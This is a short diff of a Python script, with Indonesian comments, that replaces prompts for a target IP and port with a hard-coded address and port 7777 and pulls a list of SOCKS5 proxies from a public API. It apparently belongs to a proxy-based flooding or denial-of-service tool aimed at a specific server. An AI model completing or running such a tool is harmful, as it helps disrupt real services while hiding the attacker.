@@ -5,8 +5,8 @@ import requests
 import socks
 import struct
 
-target_ip = input("Masukkan IP target: ")
-target_port = int(input("Masukkan port target: "))
+target_ip = "204.10.192.67"
+target_port = 7777
 
 # Ambil data proxy dari API
 url = 'https://proxylist.geonode.com/api/proxy-list?protocols=socks5&limit=500&page=1&sort_by=lastChecked&sort_type=desc'
